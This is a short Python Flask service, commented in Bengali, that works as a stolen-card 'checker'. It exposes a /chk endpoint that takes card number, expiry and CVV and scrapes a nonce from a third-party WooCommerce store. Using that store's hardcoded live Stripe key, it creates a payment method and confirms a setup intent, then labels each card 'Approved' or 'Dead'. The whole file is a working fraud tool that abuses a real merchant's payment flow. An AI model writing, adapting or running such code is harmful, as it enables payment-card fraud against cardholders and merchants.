from flask import Flask, request, jsonify
import asyncio
import aiohttp

app = Flask(__name__)

DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"

async def check_card(card):
    try:
        cc, mon, year, cvv = card.split("|")
        year = year[-2:]
        
        async with aiohttp.ClientSession() as session:
            # ১. গেট ননস (Nonce)
            async with session.get(f"{DOMAIN}/my-account/add-payment-method/") as resp:
                text = await resp.text()
                # সিম্পল পার্সিং
                nonce = text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

            # ২. পেমেন্ট মেথড তৈরি
            data2 = {
                "type": "card", "card[number]": cc, "card[cvc]": cvv,
                "card[exp_year]": year, "card[exp_month]": mon, "key": PK
            }
            async with session.post("https://api.stripe.com/v1/payment_methods", data=data2) as resp2:
                res2 = await resp2.json()
                pmid = res2.get("id")

            if not pmid:
                return f"❌ Declined: {res2.get('error', {}).get('message', 'Error')}"

            # ৩. কনফার্মেশন (Final Check)
            data3 = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce
            }
            async with session.post(f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=data3) as resp3:
                res3 = await resp3.text()
                if "success" in res3.lower():
                    return "✅ Approved"
                else:
                    return f"❌ Dead: {res3}"
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

@app.route('/chk')
def api_chk():
    card = request.args.get('data')
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_card(card))
    return result

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    